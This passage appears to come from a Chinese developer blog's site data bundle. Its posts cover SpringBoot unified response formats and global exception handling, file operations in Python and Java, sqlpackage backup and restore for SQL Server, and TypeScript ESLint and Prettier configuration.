基于以上种种情况，如果你和前端开发人员联调接口她们就会很懵逼，由于我们没有给他一个统一的格式，前端人员不知道如何处理返回值。 \n 还有甚者，有的同学比如小张喜欢对结果进行封装，他使用了Result对象，小王也喜欢对结果进行包装，但是他却使用的是Response对象，当出现这种情况时我相信前端人员一定会抓狂的。 \n 所以我们项目中是需要定义一个统一的标准返回格式的。 \n 定义返回标准格式 \n 一个标准的返回格式至少包含3部分： \n \n status 状态值：由后端统一定义各种返回结果的状态码 \n message 描述：本次接口调用的结果描述 \n data 数据：本次返回的数据。 \n \n { \n   "status" : "100" , \n   "message" : "操作成功" , \n   "data" : "hello,javadaily" \n } \n \n 1 2 3 4 5 当然也可以按需加入其他扩展值，比如我们就在返回对象中添加了接口调用时间 \n timestamp: 接口调用时间 \n 定义返回对象 \n @Data \n public   class   ResultData < T >   { \n   /** 结果状态 ,具体状态码参见ResultData.java*/ \n   private   int  status ; \n   private   String  message ; \n   private   T  data ; \n   private   long  timestamp  ; \n\n\n   public   ResultData   ( ) { \n     this . timestamp  =   System . currentTimeMillis ( ) ; \n   } \n\n\n   public   static   < T >   ResultData < T >   success ( T  data )   { \n     ResultData < T >  resultData  =   new   ResultData < > ( ) ; \n    resultData . setStatus ( ReturnCode . RC100 . getCode ( ) ) ; \n    resultData . setMessage ( ReturnCode . RC100 . getMessage ( ) ) ; \n    resultData . setData ( data ) ; \n     return  resultData ; \n   } \n\n   public   static   < T >   ResultData < T >   fail ( int  code ,   String  message )   { \n     ResultData < T >  resultData  =   new   ResultData < > ( ) ; \n    resultData . setStatus ( code ) ; \n    resultData . setMessage ( message ) ; \n     return  resultData ; \n   } \n\n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #  定义状态码 \n public   enum   ReturnCode   { \n     /**操作成功**/ \n     RC100 ( 100 , "操作成功" ) , \n     /**操作失败**/ \n     RC999 ( 999 , "操作失败" ) , \n     /**服务限流**/ \n     RC200 ( 200 , "服务开启限流保护,请稍后再试!" ) , \n     /**服务降级**/ \n     RC201 ( 201 , "服务开启降级保护,请稍后再试!" ) , \n     /**热点参数限流**/ \n     RC202 ( 202 , "热点参数限流,请稍后再试!" ) , \n     /**系统规则不满足**/ \n     RC203 ( 203 , "系统规则不满足要求,请稍后再试!" ) , \n     /**授权规则不通过**/ \n     RC204 ( 204 , "授权规则不通过,请稍后再试!" ) , \n     /**access_denied**/ \n     RC403 ( 403 , "无访问权限,请联系管理员授予权限" ) , \n     /**access_denied**/ \n     RC401 ( 401 , "匿名用户访问无权限资源时的异常" ) , \n     /**服务异常**/ \n     RC500 ( 500 , "系统异常，请稍后重试" ) , \n\n     INVALID_TOKEN ( 2001 , "访问令牌不合法" ) , \n     ACCESS_DENIED ( 2003 , "没有权限访问该资源" ) , \n     CLIENT_AUTHENTICATION_FAILED ( 1001 , "客户端认证失败" ) , \n     USERNAME_OR_PASSWORD_ERROR ( 1002 , "用户名或密码错误" ) , \n     UNSUPPORTED_GRANT_TYPE ( 1003 ,   "不支持的认证模式" ) ; \n\n\n\n     /**自定义状态码**/ \n     private   final   int  code ; \n     /**自定义描述**/ \n     private   final   String  message ; \n\n     ReturnCode ( int  code ,   String  message ) { \n         this . code  =  code ; \n         this . message  =  message ; \n     } \n\n\n     public   int   getCode ( )   { \n         return  code ; \n     } \n\n     public   String   getMessage ( )   { \n         return  message ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 #  统一返回格式 \n @GetMapping ( "/hello" ) \n public   ResultData < String >   getStr ( ) { \n  return   ResultData . success ( "hello,javadaily" ) ; \n } \n \n 1 2 3 4 此时调用接口获取到的返回值是这样： \n { \n   "status" :   100 , \n   "message" :   "hello,javadaily" , \n   "data" :   null , \n   "timestamp" :   1625736481648 , \n   "httpStatus" :   0 \n } \n \n 1 2 3 4 5 6 7 这样确实已经实现了我们想要的结果，我在很多项目中看到的都是这种写法，在Controller层通过ResultData.success()对返回结果进行包装后返回给前端。 \n 看到这里我们不妨停下来想想，这样做有什么弊端呢？ \n 最大的弊端就是我们后面每写一个接口都需要调用ResultData.success()这行代码对结果进行包装，重复劳动，浪费体力； \n 所以呢我们需要对代码进行优化，目标就是不要每个接口都手工制定ResultData返回值。 \n 高级实现方式 \n 要优化这段代码很简单，我们只需要借助SpringBoot提供的ResponseBodyAdvice即可。 \n ResponseBodyAdvice的作用：拦截Controller方法的返回值，统一处理返回值/响应体，一般用来统一返回格式，加解密，签名等等。\n \n 先来看下ResponseBodyAdvice的源码： \n public   interface   ResponseBodyAdvice < T >   { \n   /**\n  * 是否支持advice功能\n  * true 支持，false 不支持\n  */ \n     boolean   supports ( MethodParameter  var1 ,   Class < ?   extends   HttpMessageConverter < ? > >  var2 ) ; \n\n    /**\n  * 对返回的数据进行处理\n  */ \n     @Nullable \n     T   beforeBodyWrite ( @Nullable   T  var1 ,   MethodParameter  var2 ,   MediaType  var3 ,   Class < ?   extends   HttpMessageConverter < ? > >  var4 ,   ServerHttpRequest  var5 ,   ServerHttpResponse  var6 ) ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 我们只需要编写一个具体实现类即可 \n /**\n * @author jam\n * @date 2021/7/8 10:10 上午\n */ \n @RestControllerAdvice \n public   class   ResponseAdvice   implements   ResponseBodyAdvice < Object >   { \n     @Autowired \n     private   ObjectMapper  objectMapper ; \n\n     @Override \n     public   boolean   supports ( MethodParameter  methodParameter ,   Class < ?   extends   HttpMessageConverter < ? > >  aClass )   { \n         return   true ; \n     } \n\n     @SneakyThrows \n     @Override \n     public   Object   beforeBodyWrite ( Object  o ,   MethodParameter  methodParameter ,   MediaType  mediaType ,   Class < ?   extends   HttpMessageConverter < ? > >  aClass ,   ServerHttpRequest  serverHttpRequest ,   ServerHttpResponse  serverHttpResponse )   { \n         if ( o  instanceof   String ) { \n             return  objectMapper . writeValueAsString ( ResultData . success ( o ) ) ; \n         } \n         return   ResultData . success ( o ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 需要注意两个地方： \n @RestControllerAdvice注解 \n RestControllerAdvice是@RestController注解的增强，可以实现三个方面的功能： \n \n 全局异常处理 \n 全局数据绑定 \n 全局数据预处理 \n String类型判断 \n if ( o  instanceof   String ) { \n   return  objectMapper . writeValueAsString ( ResultData . success ( o ) ) ; \n } \n \n 1 2 3 这段代码一定要加，如果Controller直接返回String的话，SpringBoot是直接返回，故我们需要手动转换成json。 \n 经过上面的处理我们就再也不需要通过ResultData.success()来进行转换了，直接返回原始数据格式，SpringBoot自动帮我们实现包装类的封装。 \n @GetMapping ( "/hello" ) \n public   String   getStr ( ) { \n     return   "hello,javadaily" ; \n } \n \n 1 2 3 4 此时我们调用接口返回的数据结果为： \n { \n   "status" :   100 , \n   "message" :   "操作成功" , \n   "data" :   "hello,javadaily" , \n   "timestamp" :   1626427373113 \n } \n \n 1 2 3 4 5 6 是不是感觉很完美，别急，还有个问题在等着你呢。 \n 接口异常问题 \n 此时有个问题，由于我们没对Controller的异常进行处理，当我们调用的方法一旦出现异常，就会出现问题，比如下面这个接口 \n @GetMapping ( "/wrong" ) \n public   int   error ( ) { \n     int  i  =   9 / 0 ; \n     return  i ; \n } \n \n 1 2 3 4 5 返回的结果为： \n \n \n 1 这显然不是我们想要的结果，接口都报错了还返回操作成功的响应码，前端看了会打人的。 \n 别急，接下来我们进入第二个议题，如何优雅的处理全局异常。 \n SpringBoot为什么需要全局异常处理器 \n \n 不用手写try...catch，由全局异常处理器统一捕获\n使用全局异常处理器最大的便利就是程序员在写代码时不再需要手写try...catch了，前面我们讲过，默认情况下SpringBoot出现异常时返回的结果是这样： \n \n { \n   "timestamp" :   "2021-07-08T08:05:15.423+00:00" , \n   "status" :   500 , \n   "error" :   "Internal Server Error" , \n   "path" :   "/wrong" \n } \n \n 1 2 3 4 5 6 这种数据格式返回给前端，前端是看不懂的，所以这时候我们一般通过try...catch来处理异常 \n @GetMapping ( "/wrong" ) \n public   int   error ( ) { \n     int  i ; \n     try { \n        i  =   9 / 0 ; \n     } catch   ( Exception  e ) { \n        log . error ( "error:{}" , e ) ; \n        i  =   0 ; \n     } \n     return  i ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 我们追求的目标肯定是不需要再手动写try...catch了，而是希望由全局异常处理器处理。 \n 对于自定义异常，只能通过全局异常处理器来处理 \n @GetMapping ( "error1" ) \n public   void   empty ( ) { \n  throw    new   RuntimeException ( "自定义异常" ) ; \n } \n \n 1 2 3 4 当我们引入Validator参数校验器的时候，参数校验不通过会抛出异常，此时是无法用try...catch捕获的，只能使用全局异常处理器。SpringBoot集成参数校验请参考这篇文章 SpringBoot开发秘籍 - 集成参数校验及高阶技巧 \n 如何实现全局异常处理器 \n @Slf4j \n @RestControllerAdvice \n public   class   RestExceptionHandler   { \n     /**\n     * 默认全局异常处理。\n     * @param e the e\n     * @return ResultData\n     */ \n     @ExceptionHandler ( Exception . class ) \n     @ResponseStatus ( HttpStatus . INTERNAL_SERVER_ERROR ) \n     public   ResultData < String >   exception ( Exception  e )   { \n        log . error ( "全局异常信息 ex={}" ,  e . getMessage ( ) ,  e ) ; \n         return   ResultData . fail ( ReturnCode . RC500 . getCode ( ) , e . getMessage ( ) ) ; \n     } \n\n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 有三个细节需要说明一下： \n \n @RestControllerAdvice，RestController的增强类，可用于实现全局异常处理器 \n @ExceptionHandler,统一处理某一类异常，从而减少代码重复率和复杂度，比如要获取自定义异常可以@ExceptionHandler(BusinessException.class) \n @ResponseStatus指定客户端收到的http状态码 \n 体验效果 \n 这时候我们调用如下接口： \n @GetMapping ( "error1" ) \n public   void   empty ( ) { \n     throw   new   RuntimeException ( "自定义异常" ) ; \n } \n \n 1 2 3 4 返回的结果如下： \n { \n   "status" :   500 , \n   "message" :   "自定义异常" , \n   "data" :   null , \n   "timestamp" :   1625795902556 \n } \n \n 1 2 3 4 5 6 基本满足我们的需求了。 \n 但是当我们同时启用统一标准格式封装功能ResponseAdvice和RestExceptionHandler全局异常处理器时又出现了新的问题： \n { \n   "status" :   100 , \n   "message" :   "操作成功" , \n   "data" :   { \n     "status" :   500 , \n     "message" :   "自定义异常" , \n     "data" :   null , \n     "timestamp" :   1625796167986 \n   } , \n   "timestamp" :   1625796168008 \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 此时返回的结果是这样，统一格式增强功能会给返回的异常结果再次封装，所以接下来我们需要解决这个问题。 \n 全局异常接入返回的标准格式 \n 要让全局异常接入标准格式很简单，因为全局异常处理器已经帮我们封装好了标准格式，我们只需要直接返回给客户端即可。 \n @SneakyThrows \n @Override \n public   Object   beforeBodyWrite ( Object  o ,   MethodParameter  methodParameter ,   MediaType  mediaType ,   Class < ?   extends   HttpMessageConverter < ? > >  aClass ,   ServerHttpRequest  serverHttpRequest ,   ServerHttpResponse  serverHttpResponse )   { \n   if ( o  instanceof   String ) { \n     return  objectMapper . writeValueAsString ( ResultData . success ( o ) ) ; \n   } \n   if ( o  instanceof   ResultData ) { \n     return  o ; \n   } \n   return   ResultData . success ( o ) ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 关键代码： \n if ( o  instanceof   ResultData ) { \n   return  o ; \n } \n \n 1 2 3 如果返回的结果是ResultData对象，直接返回即可。 \n 这时候我们再调用上面的错误方法，返回的结果就符合我们的要求了。 \n { \n   "status" :   500 , \n   "message" :   "自定义异常" , \n   "data" :   null , \n   "timestamp" :   1625796580778 \n } \n \n 1 2 3 4 5 6 好了，今天的文章就到这里了，希望通过这篇文章你能掌握如何在你项目中友好实现统一标准格式到返回并且可以优雅的处理全局异常 \n'},{title:"文件操作相关",frontmatter:{title:"文件操作相关",date:"2022-02-17T19:21:07.000Z",tags:["Java","python"],categories:"io",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/tools/read_write_file.html",relativePath:"blogs/tools/read_write_file.md",key:"v-7ccf6496",path:"/blogs/tools/read_write_file.html",headers:[{level:2,title:"python",slug:"python"},{level:3,title:"读取文件",slug:"读取文件"},{level:3,title:"写入文件",slug:"写入文件"},{level:3,title:"删除文件",slug:"删除文件"},{level:2,title:"java",slug:"java"},{level:3,title:"读取文件",slug:"读取文件-2"},{level:3,title:"写入文件",slug:"写入文件-2"},{level:2,title:"nodejs",slug:"nodejs"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 下面列出不同语言常见文件操作 \n python \n 读取文件 \n file_path  =   "abstest.py" \n with   open ( file_path ,   "r" ,  encoding = "utf-8" )   as  fp : \n    contents  =  fp . readlines ( ) \n print ( type ( contents ) ) \n<class \'list\'> \n \n 1 2 3 4 5 #  写入文件 \n \n "x" - 创建 - 将创建一个文件，如果文件存在则返回错误 \n "a" - 追加 - 如果指定的文件不存在，将创建一个文件 \n "w" - 写入 - 如果指定的文件不存在，将创建一个文件，会覆盖原文件 \n \n file_path  =   "abstestbak.py" \n with   open ( file_path ,   "w" ,  encoding = "utf-8" )   as  fp2 : \nfp2.write("".join(contents)) \n    fp2 . writelines ( contents ) \n \n 1 2 3 4 #  删除文件 \n file_path  =   "abstestbak.py" \n if  os . path . exists ( file_path ) : \n    os . remove ( file_path ) \n \n 1 2 3 #  java \n < dependency > \n     < groupId > commons-io </ groupId > \n     < artifactId > commons-io </ artifactId > \n     < version > 2.6 </ version > \n </ dependency > \n \n 1 2 3 4 5 #  读取文件 \n File  file  =   new   File ( "test.txt" ) ; \n List < String >  lines  =   FileUtils . readLines ( file ) \n \n 1 2 File  file  =   new   File ( "test.txt" ) ; \n List < String >  lines  =   IOUtils . readLines ( new   FileInputStream ( file ) ,   "UTF-8" ) ; \n \n 1 2 #  写入文件 \n \n 会覆盖员文件，如果指定的文件不存在，将创建一个文件。 \n \n File  file  =   new   File ( "test.txt" ) ; \n List < String >  lines  =   new   ArrayList < > ( ) ; \n . . . . . \n FileUtils . writeLines ( file ,   "UTF-8" ,  lines ) ; \n \n 1 2 3 4 \n 不会覆盖原文件 \n \n File  file  =   new   File ( "test.txt" ) ; \n OutputStream  os  =   new   FileOutputStream ( file ,   true ) ; \n IOUtils . writeLines ( lines ,   null ,  os ,   "UTF-8" ) ; \n \n 1 2 3 #  nodejs \n Node.js 文件系统 \n'},{title:"使用 sqlpackage 备份和还原 SQL Server",frontmatter:{title:"使用 sqlpackage 备份和还原 SQL Server ",date:"2021-06-19T17:05:47.000Z",tags:["sqlserver"],categories:"database",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/sqlserver/sqlserver_backup_and_restore.html",relativePath:"blogs/sqlserver/sqlserver_backup_and_restore.md",key:"v-bd4d6aca",path:"/blogs/sqlserver/sqlserver_backup_and_restore.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' SqlPackage 。 \n 备份 \n sqlpackage.exe /TargetFile: "D:\\docker\\SQL Server\\sqldb-coredx-runtime-ac-dev001.bacpac"  /Action:Export /SourceServerName: "127.0.0.1"  /SourceUser: "sa"  /SourcePassword: "!SqlServer2"  /SourceDatabaseName: "mdmDB" \n \n 1 #  还原 \n sqlpackage.exe /SourceFile: "D:\\docker\\SQL Server\\sqldb-coredx-runtime-ac-dev001.bacpac"  /Action:Import /TargetServerName: "127.0.0.1"  /TargetUser: "sa"  /TargetPassword: "!SqlServer2"  /TargetDatabaseName: "mdmDB" \n \n 1 '},{title:"在 TypeScript 中, 如何动态地添加属性给一个对象",frontmatter:{title:"在 TypeScript 中, 如何动态地添加属性给一个对象",date:"2021-10-18 21:11:16",tags:["typescript"],categories:"front-end-ts",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/typescript/typescript_object_add_key.html",relativePath:"blogs/typescript/typescript_object_add_key.md",key:"v-eef0feba",path:"/blogs/typescript/typescript_object_add_key.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 如果是自己定义的对象，想动态给对象增加key，value，obj.xx=xx,obj[xx]=xx，都会报错，一种优雅快速的方式是： \n interface   LooseObject   { \n     [ key :   string ] :   any \n } \n\n var  obj :  LooseObject  =   { } ; \n \n 1 2 3 4 5 这种方式还可以对对象做一些类型规则，比如在LooseObject里加必须的字段和其他字段必须接受的类型等。 \n"},{title:"TypeScript 类型检查",frontmatter:{title:"TypeScript 类型检查",date:"2021-12-27 21:22:10",tags:["eslint","vscode"],categories:"typescript",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/typescript/typescript_type_check.html",relativePath:"blogs/typescript/typescript_type_check.md",key:"v-66db61c2",path:"/blogs/typescript/typescript_type_check.html",headers:[{level:2,title:"什么是代码检查",slug:"什么是代码检查"},{level:2,title:"为什么需要代码检查",slug:"为什么需要代码检查"},{level:2,title:"在 TypeScript 中使用 ESLint",slug:"在-typescript-中使用-eslint"},{level:3,title:"安装 ESLint§",slug:"安装-eslint§"},{level:2,title:"创建配置文件",slug:"创建配置文件"},{level:2,title:"检查一个 ts 文件",slug:"检查一个-ts-文件"},{level:2,title:"检查所有文件",slug:"检查所有文件"},{level:2,title:"在 VSCode 中集成 ESLint 检查",slug:"在-vscode-中集成-eslint-检查"},{level:2,title:"使用 Prettier 修复格式错误",slug:"使用-prettier-修复格式错误"},{level:2,title:"使用 AlloyTeam 的 ESLint 配置",slug:"使用-alloyteam-的-eslint-配置"},{level:2,title:"使用 ESLint 检查 tsx 文件§",slug:"使用-eslint-检查-tsx-文件§"},{level:3,title:"安装 eslint-plugin-react§",slug:"安装-eslint-plugin-react§"},{level:3,title:"VSCode 的配置中新增 typescriptreact 检查",slug:"vscode-的配置中新增-typescriptreact-检查"},{level:2,title:"Troubleshootings§",slug:"troubleshootings§"},{level:2,title:"VSCode 没有显示出 ESLint 的报错",slug:"vscode-没有显示出-eslint-的报错"},{level:2,title:"为什么有些定义了的变量（比如使用 enum 定义的变量）未使用，ESLint 却没有报错？§",slug:"为什么有些定义了的变量-比如使用-enum-定义的变量-未使用-eslint-却没有报错-§"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 2019 年 1 月，TypeScirpt 官方决定全面采用 ESLint 作为代码检查的工具，并创建了一个新项目 typescript-eslint，提供了 TypeScript 文件的解析器 @typescript-eslint/parser 和相关的配置选项 @typescript-eslint/eslint-plugin 等。而之前的两个 lint 解决方案都将弃用： \n \n typescript-eslint-parser 已停止维护 \n TSLint 将提供迁移工具，并在 typescript-eslint 的功能足够完整后停止维护 TSLint（Once we consider ESLint feature-complete w.r.t. TSLint, we will deprecate TSLint and help users migrate to ESLint1）\n综上所述，目前以及将来的 TypeScript 的代码检查方案就是 typescript-eslint。 \n 什么是代码检查 \n 代码检查主要是用来发现代码错误、统一代码风格。 \n 在 JavaScript 项目中，我们一般使用 ESLint 来进行代码检查，它通过插件化的特性极大的丰富了适用范围，搭配 typescript-eslint 之后，甚至可以用来检查 TypeScript 代码。 \n 为什么需要代码检查 \n 有人会觉得，JavaScript 非常灵活，所以需要代码检查。而 TypeScript 已经能够在编译阶段检查出很多问题了，为什么还需要代码检查呢？ \n 因为 TypeScript 关注的重心是类型的检查，而不是代码风格。当团队的人员越来越多时，同样的逻辑不同的人写出来可能会有很大的区别： \n -- 缩进应该是四个空格还是两个空格？\n-- 是否应该禁用 var？\n-- 接口名是否应该以 I 开头？\n-- 是否应该强制使用 === 而不是 ==？ \n 这些问题 TypeScript 不会关注，但是却影响到多人协作开发时的效率、代码的可理解性以及可维护性。 \n eslint 能够发现出一些 tsc 不会关心的错误，检查出一些潜在的问题，所以代码检查还是非常重要的。 \n 在 TypeScript 中使用 ESLint \n 安装 ESLint§ \n ESLint 可以安装在当前项目中或全局环境下，因为代码检查是项目的重要组成部分，所以我们一般会将它安装在当前项目中。可以运行下面的脚本来安装。\n由于 ESLint 默认使用 Espree 进行语法解析，无法识别 TypeScript 的一些语法，故我们需要安装 @typescript-eslint/parser，替代掉默认的解析器，别忘了同时安装 typescript。\n接下来需要安装对应的插件 @typescript-eslint/eslint-plugin 它作为 eslint 默认规则的补充，提供了一些额外的适用于 ts 语法的规则。 \n npm   install  --save-dev eslint typescript @typescript-eslint/parser @typescript-eslint/eslint-plugin eslint-config-google\n \n 1 #  创建配置文件 \n ESLint 需要一个配置文件来决定对哪些规则进行检查，配置文件的名称一般是 .eslintrc.js 或 .eslintrc.json \n 当运行 ESLint 的时候检查一个文件的时候，它会首先尝试读取该文件的目录下的配置文件，然后再一级一级往上查找，将所找到的配置合并起来，作为当前被检查文件的配置。 \n 我们在项目的根目录下创建一个 .eslintrc.js，内容如下： \n module . exports  =   { \n  env :   { \n    browser :   true , \n    es2021 :   true , \n   } , \n   extends :   [ \'google\' ] , \n  parser :   \'@typescript-eslint/parser\' , \n  parserOptions :   { \n    ecmaVersion :   13 , \n    sourceType :   \'module\' , \n   } , \n  plugins :   [ \'@typescript-eslint\' ] , \n  rules :   { \n     \'no-var\' :   \'error\' , \n     \'@typescript-eslint/no-explicit-any\' :   2 , \n     \'@typescript-eslint/consistent-type-definitions\' :   [ \'error\' ,   \'interface\' ] , \n   } , \n } ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 以上配置中，我们指定了两个规则，其中 no-var 是 ESLint 原生的规则，@typescript-eslint/consistent-type-definitions 是 @typescript-eslint/eslint-plugin 新增的规则。 \n 规则的取值一般是一个数组（上例中的 @typescript-eslint/consistent-type-definitions），其中第一项是 off、warn 或 error 中的一个，表示关闭、警告和报错。后面的项都是该规则的其他配置。 \n 如果没有其他配置的话，则可以将规则的取值简写为数组中的第一项（上例中的 no-var）。 \n 关闭、警告和报错的含义如下： \n \n 关闭：禁用此规则 \n 警告：代码检查时输出错误信息，但是不会影响到 exit code \n 报错：发现错误时，不仅会输出错误信息，而且 exit code 将被设为 1（一般 exit code 不为 0 则表示执行出现错误） \n 检查一个 ts 文件 \n ./node_modules/.bin/eslint index.ts\n \n 1 需要注意的是，我们使用的是 ./node_modules/.bin/eslint，而不是全局的 eslint 脚本，这是因为代码检查是项目的重要组成部分，所以我们一般会将它安装在当前项目中。 \n 可是每次执行这么长一段脚本颇有不便，我们可以通过在 package.json 中添加一个 script 来创建一个 npm script 来简化这个步骤： \n { \n     "scripts" :   { \n         "eslint" :   "eslint index.ts" \n     } \n } \n \n 1 2 3 4 5 这时只需执行  npm run eslint  即可。 \n 检查所有文件 \n { \n     "scripts" :   { \n         "eslint" :   "eslint src --ext .ts" \n     } \n } \n \n 1 2 3 4 5 #  在 VSCode 中集成 ESLint 检查 \n 在编辑器中集成 ESLint 检查，可以在开发过程中就发现错误，甚至可以在保存时自动修复错误，极大的增加了开发效率。 \n 要在 VSCode 中集成 ESLint 检查，我们需要先安装 ESLint 插件，点击「扩展」按钮，搜索 ESLint，然后安装即可。 \n 我们还可以开启保存时自动修复的功能，通过配置, 就可以在保存文件后，自动修复为。 \n VSCode 中的 ESLint 插件默认是不会检查 .ts 后缀的，需要在「文件 => 首选项 => 设置 => 工作区」中（也可以在项目根目录下创建一个配置文件 .vscode/settings.json），添加以下配置： \n { \n     "[typescript]" :   { \n         "editor.defaultFormatter" :   "dbaeumer.vscode-eslint" \n     } , \n     "eslint.autoFixOnSave" :   true , \n     "eslint.validate" :   [ \n         "javascript" , \n         "javascriptreact" , \n         "typescript" \n     ] , \n     "typescript.tsdk" :   "node_modules/typescript/lib" \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 #  使用 Prettier 修复格式错误 \n ESLint 包含了一些代码格式的检查，比如空格、分号等。但前端社区中有一个更先进的工具可以用来格式化代码，那就是 Prettier。 \n Prettier 聚焦于代码的格式化，通过语法分析，重新整理代码的格式，让所有人的代码都保持同样的风格。 \n 首先需要安装 Prettier： \n npm   install  --save-dev prettier\n \n 1 然后创建一个 prettier.config.js 文件，里面包含 Prettier 的配置项。Prettier 的配置项很少，这里我推荐大家一个配置规则，作为参考： \n // prettier.config.js or .prettierrc.js \nmodule . exports  =   { \n     // 一行最多 100 字符 \n    printWidth :   100 , \n     // 使用 4 个空格缩进 \n    tabWidth :   2 , \n     // 不使用缩进符，而使用空格 \n    useTabs :   false , \n     // 行尾需要有分号 \n    semi :   true , \n     // 使用单引号 \n    singleQuote :   true , \n     // 对象的 key 仅在必要时用引号 \n    quoteProps :   \'as-needed\' , \n     // jsx 不使用单引号，而使用双引号 \n    jsxSingleQuote :   false , \n     // 末尾不需要逗号 \n    trailingComma :   \'none\' , \n     // 大括号内的首尾需要空格 \n    bracketSpacing :   true , \n     // jsx 标签的反尖括号需要换行 \n    jsxBracketSameLine :   false , \n     // 箭头函数，只有一个参数的时候，也需要括号 \n    arrowParens :   \'always\' , \n     // 每个文件格式化的范围是文件的全部内容 \n    rangeStart :   0 , \n    rangeEnd :   Infinity , \n     // 不需要写文件开头的 @prettier \n    requirePragma :   false , \n     // 不需要自动在文件开头插入 @prettier \n    insertPragma :   false , \n     // 使用默认的折行标准 \n    proseWrap :   \'preserve\' , \n     // 根据显示样式决定 html 要不要折行 \n    htmlWhitespaceSensitivity :   \'css\' , \n     // 换行符使用 lf \n    endOfLine :   \'lf\' \n } ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 接下来安装 VSCode 中的 Prettier 插件，然后修改 .vscode/settings.json： \n { \n     "files.eol" :   "\\n" , \n     "editor.tabSize" :   2 , \n     "editor.formatOnSave" :   true , \n     "editor.defaultFormatter" :   "esbenp.prettier-vscode" , \n     "eslint.autoFixOnSave" :   true , \n     "eslint.validate" :   [ \n         "javascript" , \n         "javascriptreact" , \n         { \n             "language" :   "typescript" , \n             "autoFix" :   true \n         } \n     ] , \n     "typescript.tsdk" :   "node_modules/typescript/lib" \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 这样就实现了保存文件时自动格式化并且自动修复 ESLint 错误。 \n 需要注意的是，由于 ESLint 也可以检查一些代码格式的问题，所以在和 Prettier 配合使用时，我们一般会把 ESLint 中的代码格式相关的规则禁用掉，否则就会有冲突了 \n 使用 AlloyTeam 的 ESLint 配置 \n ESLint 原生的规则和 @typescript-eslint/eslint-plugin 的规则太多了，而且原生的规则有一些在 TypeScript 中支持的不好，需要禁用掉。 \n 这里我推荐使用 AlloyTeam ESLint 规则中的 TypeScript 版本，它已经为我们提供了一套完善的配置规则，并且与 Prettier 是完全兼容的（eslint-config-alloy 不包含任何代码格式的规则，代码格式的问题交给更专业的 Prettier 去处理）。 \n 安装： \n npm   install  --save-dev eslint typescript @typescript-eslint/parser @typescript-eslint/eslint-plugin eslint-config-alloy\n \n 1 在你的项目根目录下创建 .eslintrc.js，并将以下内容复制到文件中即可： \n module . exports  =   { \n     extends :   [ \n         \'alloy\' , \n         \'alloy/typescript\' , \n     ] , \n    env :   { \n         // 您的环境变量（包含多个预定义的全局变量） \n         // Your environments (which contains several predefined global variables) \n         // \n         // browser: true, \n         // node: true, \n         // mocha: true, \n         // jest: true, \n         // jquery: true \n     } , \n    globals :   { \n         // 您的全局变量（设置为 false 表示它不允许被重新赋值） \n         // Your global variables (setting to false means it\'s not allowed to be reassigned) \n         // \n         // myGlobal: false \n     } , \n    rules :   { \n         // 自定义您的规则 \n         // Customize your rules \n     } \n } ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 更多的使用方法，请参考  AlloyTeam ESLint 规则 \n 使用 ESLint 检查 tsx 文件§ \n 如果需要同时支持对 tsx 文件的检查，则需要对以上步骤做一些调整： \n 安装 eslint-plugin-react§ \n npm   install  --save-dev eslint-plugin-react\n \n 1 package.json 中的 scripts.eslint 添加 .tsx 后缀§ \n { \n     "scripts" :   { \n         "eslint" :   "eslint src --ext .ts,.tsx" \n     } \n } \n \n 1 2 3 4 5 #  VSCode 的配置中新增 typescriptreact 检查 \n { \n     "files.eol" :   "\\n" , \n     "editor.tabSize" :   2 , \n     "editor.formatOnSave" :   true , \n     "editor.defaultFormatter" :   "esbenp.prettier-vscode" , \n     "eslint.autoFixOnSave" :   true , \n     "eslint.validate" :   [ \n         "javascript" , \n         "javascriptreact" , \n         { \n             "language" :   "typescript" , \n             "autoFix" :   true \n         } , \n         { \n             "language" :   "typescriptreact" , \n             "autoFix" :   true \n         } \n     ] , \n     "typescript.tsdk" :   "node_modules/typescript/lib" \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 使用 AlloyTeam ESLint 规则中的 TypeScript React 版本§\n AlloyTeam ESLint 规则中的 TypeScript React 版本 \n Troubleshootings§ \n Cannot find module \'@typescript-eslint/parser\'\n你运行的是全局的 eslint，需要改为运行 ./node_modules/.bin/eslint。 \n VSCode 没有显示出 ESLint 的报错 \n \n 检查「文件 => 首选项 => 设置」中有没有配置正确 \n 检查必要的 npm 包有没有安装 \n 检查 .eslintrc.js 有没有配置 \n 检查文件是不是在 .eslintignore 中 \n 如果以上步骤都不奏效，则可以在「文件 => 首选项 => 设置」中配置 "eslint.trace.server": "messages"，按 Ctrl+Shift+U 打开输出面板，然后选择 ESLint 输出，查看具体错误。 \n 为什么有些定义了的变量（比如使用 enum 定义的变量）未使用，ESLint 却没有报错？§ \n 因为无法支持这种变量定义的检查。建议在 tsconfig.json 中添加以下配置，使 tsc 编译过程能够检查出定义了未使用的变量： \n { \n     "compilerOptions" :   { \n         "noUnusedLocals" :   true , \n         "noUnusedParameters" :   true \n     } \n } \n \n 1 2 3 4 5 6 启用了 noUnusedParameters 